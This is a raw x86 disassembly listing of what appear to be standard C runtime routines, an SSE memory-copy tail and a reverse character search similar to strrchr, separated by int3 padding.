  40b8f4:	66 0f 7f 77 60       	movdqa %xmm6,0x60(%edi)
  40b8f9:	66 0f 7f 7f 70       	movdqa %xmm7,0x70(%edi)
  40b8fe:	8d b6 80 00 00 00    	lea    0x80(%esi),%esi
  40b904:	8d bf 80 00 00 00    	lea    0x80(%edi),%edi
  40b90a:	4a                   	dec    %edx
  40b90b:	75 a3                	jne    0x40b8b0
  40b90d:	85 c9                	test   %ecx,%ecx
  40b90f:	74 5f                	je     0x40b970
  40b911:	8b d1                	mov    %ecx,%edx
  40b913:	c1 ea 05             	shr    $0x5,%edx
  40b916:	85 d2                	test   %edx,%edx
  40b918:	74 21                	je     0x40b93b
  40b91a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  40b920:	f3 0f 6f 06          	movdqu (%esi),%xmm0
  40b924:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
  40b929:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
  40b92d:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
  40b932:	8d 76 20             	lea    0x20(%esi),%esi
  40b935:	8d 7f 20             	lea    0x20(%edi),%edi
  40b938:	4a                   	dec    %edx
  40b939:	75 e5                	jne    0x40b920
  40b93b:	83 e1 1f             	and    $0x1f,%ecx
  40b93e:	74 30                	je     0x40b970
  40b940:	8b c1                	mov    %ecx,%eax
  40b942:	c1 e9 02             	shr    $0x2,%ecx
  40b945:	74 0f                	je     0x40b956
  40b947:	8b 16                	mov    (%esi),%edx
  40b949:	89 17                	mov    %edx,(%edi)
  40b94b:	83 c7 04             	add    $0x4,%edi
  40b94e:	83 c6 04             	add    $0x4,%esi
  40b951:	83 e9 01             	sub    $0x1,%ecx
  40b954:	75 f1                	jne    0x40b947
  40b956:	8b c8                	mov    %eax,%ecx
  40b958:	83 e1 03             	and    $0x3,%ecx
  40b95b:	74 13                	je     0x40b970
  40b95d:	8a 06                	mov    (%esi),%al
  40b95f:	88 07                	mov    %al,(%edi)
  40b961:	46                   	inc    %esi
  40b962:	47                   	inc    %edi
  40b963:	49                   	dec    %ecx
  40b964:	75 f7                	jne    0x40b95d
  40b966:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40b96d:	8d 49 00             	lea    0x0(%ecx),%ecx
  40b970:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40b974:	5e                   	pop    %esi
  40b975:	5f                   	pop    %edi
  40b976:	c3                   	ret
  40b977:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40b97e:	8b ff                	mov    %edi,%edi
  40b980:	ba 10 00 00 00       	mov    $0x10,%edx
  40b985:	2b d0                	sub    %eax,%edx
  40b987:	2b ca                	sub    %edx,%ecx
  40b989:	51                   	push   %ecx
  40b98a:	8b c2                	mov    %edx,%eax
  40b98c:	8b c8                	mov    %eax,%ecx
  40b98e:	83 e1 03             	and    $0x3,%ecx
  40b991:	74 09                	je     0x40b99c
  40b993:	8a 16                	mov    (%esi),%dl
  40b995:	88 17                	mov    %dl,(%edi)
  40b997:	46                   	inc    %esi
  40b998:	47                   	inc    %edi
  40b999:	49                   	dec    %ecx
  40b99a:	75 f7                	jne    0x40b993
  40b99c:	c1 e8 02             	shr    $0x2,%eax
  40b99f:	74 0d                	je     0x40b9ae
  40b9a1:	8b 16                	mov    (%esi),%edx
  40b9a3:	89 17                	mov    %edx,(%edi)
  40b9a5:	8d 76 04             	lea    0x4(%esi),%esi
  40b9a8:	8d 7f 04             	lea    0x4(%edi),%edi
  40b9ab:	48                   	dec    %eax
  40b9ac:	75 f3                	jne    0x40b9a1
  40b9ae:	59                   	pop    %ecx
  40b9af:	e9 e9 fe ff ff       	jmp    0x40b89d
  40b9b4:	cc                   	int3
  40b9b5:	cc                   	int3
  40b9b6:	cc                   	int3
  40b9b7:	cc                   	int3
  40b9b8:	cc                   	int3
  40b9b9:	cc                   	int3
  40b9ba:	cc                   	int3
  40b9bb:	cc                   	int3
  40b9bc:	cc                   	int3
  40b9bd:	cc                   	int3
  40b9be:	cc                   	int3
  40b9bf:	cc                   	int3
  40b9c0:	55                   	push   %ebp
  40b9c1:	8b ec                	mov    %esp,%ebp
  40b9c3:	57                   	push   %edi
  40b9c4:	83 3d dc 3a 41 00 01 	cmpl   $0x1,0x413adc
  40b9cb:	0f 82 fd 00 00 00    	jb     0x40bace
  40b9d1:	8b 7d 08             	mov    0x8(%ebp),%edi
  40b9d4:	77 77                	ja     0x40ba4d
  40b9d6:	0f b6 55 0c          	movzbl 0xc(%ebp),%edx
  40b9da:	8b c2                	mov    %edx,%eax
  40b9dc:	c1 e2 08             	shl    $0x8,%edx
  40b9df:	0b d0                	or     %eax,%edx
  40b9e1:	66 0f 6e da          	movd   %edx,%xmm3
  40b9e5:	f2 0f 70 db 00       	pshuflw $0x0,%xmm3,%xmm3
  40b9ea:	0f 16 db             	movlhps %xmm3,%xmm3
  40b9ed:	b9 0f 00 00 00       	mov    $0xf,%ecx
  40b9f2:	23 cf                	and    %edi,%ecx
  40b9f4:	83 c8 ff             	or     $0xffffffff,%eax
  40b9f7:	d3 e0                	shl    %cl,%eax
  40b9f9:	2b f9                	sub    %ecx,%edi
  40b9fb:	33 d2                	xor    %edx,%edx
  40b9fd:	f3 0f 6f 0f          	movdqu (%edi),%xmm1
  40ba01:	66 0f ef d2          	pxor   %xmm2,%xmm2
  40ba05:	66 0f 74 d1          	pcmpeqb %xmm1,%xmm2
  40ba09:	66 0f 74 cb          	pcmpeqb %xmm3,%xmm1
  40ba0d:	66 0f d7 ca          	pmovmskb %xmm2,%ecx
  40ba11:	23 c8                	and    %eax,%ecx
  40ba13:	75 18                	jne    0x40ba2d
  40ba15:	66 0f d7 c9          	pmovmskb %xmm1,%ecx
  40ba19:	23 c8                	and    %eax,%ecx
  40ba1b:	0f bd c1             	bsr    %ecx,%eax
  40ba1e:	03 c7                	add    %edi,%eax
  40ba20:	85 c9                	test   %ecx,%ecx
  40ba22:	0f 45 d0             	cmovne %eax,%edx
  40ba25:	83 c8 ff             	or     $0xffffffff,%eax
  40ba28:	83 c7 10             	add    $0x10,%edi
  40ba2b:	eb d0                	jmp    0x40b9fd
  40ba2d:	53                   	push   %ebx
  40ba2e:	66 0f d7 d9          	pmovmskb %xmm1,%ebx
  40ba32:	23 d8                	and    %eax,%ebx
  40ba34:	d1 e1                	shl    $1,%ecx
  40ba36:	33 c0                	xor    %eax,%eax
  40ba38:	2b c1                	sub    %ecx,%eax
  40ba3a:	23 c8                	and    %eax,%ecx
  40ba3c:	49                   	dec    %ecx
  40ba3d:	23 cb                	and    %ebx,%ecx
  40ba3f:	5b                   	pop    %ebx
  40ba40:	0f bd c1             	bsr    %ecx,%eax
  40ba43:	03 c7                	add    %edi,%eax
  40ba45:	85 c9                	test   %ecx,%ecx
  40ba47:	0f 44 c2             	cmove  %edx,%eax
  40ba4a:	5f                   	pop    %edi
  40ba4b:	c9                   	leave
  40ba4c:	c3                   	ret
  40ba4d:	0f b6 55 0c          	movzbl 0xc(%ebp),%edx
  40ba51:	85 d2                	test   %edx,%edx
  40ba53:	74 39                	je     0x40ba8e
  40ba55:	33 c0                	xor    %eax,%eax
  40ba57:	f7 c7 0f 00 00 00    	test   $0xf,%edi
  40ba5d:	74 15                	je     0x40ba74
  40ba5f:	0f b6 0f             	movzbl (%edi),%ecx
  40ba62:	3b ca                	cmp    %edx,%ecx
  40ba64:	0f 44 c7             	cmove  %edi,%eax
  40ba67:	85 c9                	test   %ecx,%ecx
  40ba69:	74 20                	je     0x40ba8b
  40ba6b:	47                   	inc    %edi
  40ba6c:	f7 c7 0f 00 00 00    	test   $0xf,%edi
  40ba72:	75 eb                	jne    0x40ba5f
  40ba74:	66 0f 6e c2          	movd   %edx,%xmm0
  40ba78:	83 c7 10             	add    $0x10,%edi
  40ba7b:	66 0f 3a 63 47 f0 40 	pcmpistri $0x40,-0x10(%edi),%xmm0
  40ba82:	8d 4c 0f f0          	lea    -0x10(%edi,%ecx,1),%ecx
  40ba86:	0f 42 c1             	cmovb  %ecx,%eax
  40ba89:	75 ed                	jne    0x40ba78
  40ba8b:	5f                   	pop    %edi
  40ba8c:	c9                   	leave
  40ba8d:	c3                   	ret
  40ba8e:	b8 f0 ff ff ff       	mov    $0xfffffff0,%eax
  40ba93:	23 c7                	and    %edi,%eax
  40ba95:	66 0f ef c0          	pxor   %xmm0,%xmm0
  40ba99:	66 0f 74 00          	pcmpeqb (%eax),%xmm0
  40ba9d:	b9 0f 00 00 00       	mov    $0xf,%ecx
  40baa2:	23 cf                	and    %edi,%ecx
  40baa4:	ba ff ff ff ff       	mov    $0xffffffff,%edx
  40baa9:	d3 e2                	shl    %cl,%edx
  40baab:	66 0f d7 f8          	pmovmskb %xmm0,%edi
  40baaf:	23 fa                	and    %edx,%edi
  40bab1:	75 14                	jne    0x40bac7
  40bab3:	66 0f ef c0          	pxor   %xmm0,%xmm0
  40bab7:	66 0f 74 40 10       	pcmpeqb 0x10(%eax),%xmm0
  40babc:	83 c0 10             	add    $0x10,%eax
  40babf:	66 0f d7 f8          	pmovmskb %xmm0,%edi
  40bac3:	85 ff                	test   %edi,%edi
  40bac5:	74 ec                	je     0x40bab3
  40bac7:	0f bc d7             	bsf    %edi,%edx
  40baca:	03 c2                	add    %edx,%eax
  40bacc:	eb bd                	jmp    0x40ba8b
  40bace:	8b 7d 08             	mov    0x8(%ebp),%edi
  40bad1:	33 c0                	xor    %eax,%eax
  40bad3:	83 c9 ff             	or     $0xffffffff,%ecx
  40bad6:	f2 ae                	repnz scas %es:(%edi),%al
  40bad8:	83 c1 01             	add    $0x1,%ecx
  40badb:	f7 d9                	neg    %ecx
  40badd:	83 ef 01             	sub    $0x1,%edi
  40bae0:	8a 45 0c             	mov    0xc(%ebp),%al
  40bae3:	fd                   	std
  40bae4:	f2 ae                	repnz scas %es:(%edi),%al
  40bae6:	83 c7 01             	add    $0x1,%edi
  40bae9:	38 07                	cmp    %al,(%edi)
  40baeb:	74 04                	je     0x40baf1
  40baed:	33 c0                	xor    %eax,%eax
  40baef:	eb 02                	jmp    0x40baf3
  40baf1:	8b c7                	mov    %edi,%eax
  40baf3:	fc                   	cld
  40baf4:	5f                   	pop    %edi
  40baf5:	c9                   	leave
  40baf6:	c3                   	ret
